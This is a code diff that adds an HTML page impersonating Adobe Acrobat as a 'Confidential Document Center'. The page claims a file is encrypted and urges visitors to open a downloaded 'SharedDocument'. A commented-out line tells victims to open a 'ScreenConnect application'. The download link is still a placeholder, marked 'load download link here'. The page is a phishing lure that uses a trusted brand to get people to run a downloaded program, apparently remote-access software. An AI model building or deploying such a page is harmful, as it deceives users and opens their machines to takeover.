@@ -1,0 +1,255 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	
+    <title>Cloud Share</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+	<link rel="icon" type="image/x-icon" href="https://www.linguagraphics.com/wp-content/uploads/2023/07/Adobe_Acrobat_icon.svg">
+
+<style type="text/css">
+		.txt-color{
+			color: white;
+		}
+		.box-color{
+			background-color: rgba(0,0,0,0.8);border-radius:15px;
+		}
+
+body, html {
+  height: 100%;
+  margin: 0;
+ font-family: 'Adobe Clean', adobe-clean, 'Trebuchet MS', sans-serif;
+}
+
+ 
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+
+input[type=number] {
+  -moz-appearance: textfield;
+}
+
+
+	.center{
+		position: absolute;
+		top:50%;
+		left:50%;
+		transform: translate(-50%, -50%);
+	}	
+	
+/* New Update */
+	#mainTop{
+		position: sticky;
+		top: 0px;
+		display: flex;
+		height: 63px;
+		background-color: #f8f8f842;
+		z-index: 20;
+	}
+	
+	#logo_container{
+		display:flex;
+		height: inherit;
+		align-items: center;
+		
+	}
+	#logo1{
+		height: 20px;
+		width: auto;
+		display: flex;
+		margin-left: 20px;
+	}
+	main{
+		isolation: isolate;
+		display: block;
+	}
+	#mainContent{
+		display: block;
+		position: relative;
+		justify-content: center;
+		
+	}
+	.h6{ font-size: 13px;}
+	
+	#footer{
+		position: fixed;
+		bottom: 0px;
+		width: 100%;
+		justify-content: center;
+		background: rgb(0, 11, 29);
+		height: 80px;
+		z-index: 20;
+	}
+	#footBox{
+		width: 80%;
+		display: flex;
+		position: fixed;
+		left:50%;
+		transform: translate(-50%, 20%);
+		flex-flow: row;
+		flex-wrap: nowrap;
+		background: rgb(0, 11, 29);
+		
+	}
+	.wrap{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    flex-basis: 100%;
+	}
+	.end_wrap{
+		display: flex;
+		flex-wrap: nowrap; 
+		inline-size: auto;		
+	}
+	#midBox{
+		width: 100%;
+		margin-left:50%;
+		transform: translate(-50%);
+		flex-flow: row;
+		flex-wrap: nowrap;
+		line-height: 50px;
+		text-align: left;
+		
+	}
+	.btnn{
+	background: rgb(59,99,251);
+    border-color: rgb(59,99,251);
+    color: #FFF;
+	border-radius: 20px;
+    font-size: 17px;
+    padding: 10px 30px ;
+	font-style: normal;
+    font-weight: 700;
+    text-decoration: none;
+	display: inline-block;
+	white-space: nowrap;
+	height: 50px;
+}
+	.btnn:hover{
+	background:  #1E09D5;
+    border-color: #1E09D5;
+	color: #FFF;
+	text-decoration: none;
+	}
+	
+	.fade_box{
+		background-color: rgba(0,0,0,0.9);
+  border-radius: 15px;
+	}
+</style>
+  </head>
+  <body style="font-size: .9rem; font-weight: 400; background-color:white;">
+      
+    <video id="bg_video" autoplay muted loop playsinline preload="auto"
+           style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; object-position: center; background: rgb(0, 11, 29); z-index: 0;">
+        <source src="https://www.adobe.com/upp/media_1fa8617c753dadad2b5de772c544a1091570c94b4.mp4" type="video/mp4">
+    </video>
+    <div style="position: fixed; inset: 0; background: linear-gradient(180deg, rgba(0, 11, 29, 0.72) 0%, rgba(0, 11, 29, 0.58) 45%, rgba(0, 11, 29, 0.82) 100%); z-index: 1; pointer-events: none;"></div>
+	  
+	  <div id="mainTop">
+	  	<div id="logo_container" >
+		 	<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/250px-Adobe_Acrobat_DC_logo_2020.svg.png?utm_source=en.wikipedia.org&utm_campaign=parser&utm_content=thumbnail" id="logo1" alt="Main logo"> 
+		</div>
+	  </div>
+
+      <div class="row" style="margin-right: 10px; margin-left: 10px; height: 90%; position: relative; z-index: 10;">
+        <div class="container">
+          <div class="row" >
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5 fade_box">
+              <div class="text-center pt-2" style="position: relative; z-index: 2;">
+                <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 14px;">
+                    <div style="width: 78px; height: 78px; border-radius: 18px; background: linear-gradient(135deg, #ffffff07 0%, #eef1ff1d 100%); display: flex; align-items: center; justify-content: center; box-shadow: 0 6px 18px rgba(0, 0, 0, 0.22), 0 0 0 1px rgba(255, 255, 255, 0.06) inset;">
+                        <img src="https://www.linguagraphics.com/wp-content/uploads/2023/07/Adobe_Acrobat_icon.svg" class="img-fluid" width="54px" height="54px" alt="adobe logo" style="display: block;">
+                    </div>
+                </div>
+                <h1 class="txt-color" style="margin: 0; padding: 0; font-size: 28px; line-height: 1.2; font-weight: 700; letter-spacing: -0.015em; text-shadow: 0 2px 12px rgba(0, 0, 0, 0.45);">Confidential Document Center</h1>
+                <br>
+                <div style="display: block; margin-top: 14px; background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 4px; padding: 20px 28px; text-align: left;">
+                    <div style="display: flex; align-items: center; gap: 14px;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink: 0; animation: blink-lock 1.2s ease-in-out infinite;">
+                            <path d="M18 10H17V7C17 4.24 14.76 2 12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V19C4 20.1 4.9 21 6 21H18C19.1 21 20 20.1 20 19V12C20 10.9 19.1 10 18 10ZM9 7C9 5.34 10.34 4 12 4C13.66 4 15 5.34 15 7V10H9V7Z" fill="#868e96"/>
+                            <path d="M12 17C13.1046 17 14 16.1046 14 15C14 13.8954 13.1046 13 12 13C10.8954 13 10 13.8954 10 15C10 16.1046 10.8954 17 12 17Z" fill="#868e96"/>
+                        </svg>
+                        <span class="h6" style="font-weight: 400; color: #868e96; letter-spacing: 0.01em;">This document is encrypted and requires authentication</span>
+                    </div>
+                </div>
+                <style>
+                   
+                    @keyframes blink-lock {
+                        0%, 45% { opacity: 1; }
+                        50%, 95% { opacity: 0.3; }
+                        100% { opacity: 1; }
+                    }
+                </style>
+                <!--<div class="h4 txt-color" style="font-weight: 800;">Open the downloaded ScreenConnect application to view this file</div>-->
+				<br><br>
+				<div class="h7 text-black font-weight-normal txt-color"> Bring together files, ideas, and an AI Assistant into a guided experience with PDF Spaces.</div><br>
+			
+				<div class="h6 text-black font-weight-normal txt-color">Open your download folder to access the SharedDocument.</div>
+				<br>
+				 <div class="h7 text-black font-weight-normal txt-color">
+
+If the download doesn't start automatically., <a href="GOOGLE.COM"Event card">Relaunch Download.</a></div><br>
+				<div class="h7 text-black font-weight-normal txt-color" style="justify-content: center;">
+					
+						
+					</ul>
+				</div>
+				<br>
+              </div>
+
+                
+                <div class="row">
+                  
+						
+              </div> 
+            </div>
+          </div>
+        
+			
+		
+      </div> 
+    </div>
+<div id="footer">
+	<div id="footBox">
+		<div><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/250px-Adobe_Acrobat_DC_logo_2020.svg.png?utm_source=en.wikipedia.org&utm_campaign=parser&utm_content=thumbnail" style="width: 62px; height: auto;" alt="adobe logo"></div>
+		<div class="wrap" style="margin-left: 25px;">
+				<div class="h4 txt-color" style="font-weight: 800;">Adobe Acrobat</div>
+				<div class="h6 txt-color">Get more done with new AI features in Acrobat, it starts with Adobe</div>
+		</div>
+		<div class="end_wrap">
+			<a href="#" title="Event card" class="btnn" id="dmd">Download </a></div><br>
+				<div class="h7 text-black font-weight-normal txt-color" style="justify-content: center;">
+					
+						
+					</ul>
+		</div>
+	
+	</div>			
+</div>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"0b65e1a5ad74403ca09ab78b224d8eb6","r":1}' crossorigin="anonymous"></script>
+</body>			
+
+  <script>
+/*page completed */
+	window.onload = function () {
+	var rea = document.getElementById("dmd");
+	 window.location.href = "#";
+		//load download link here
+}
+      
+  </script>
+
+  </html>
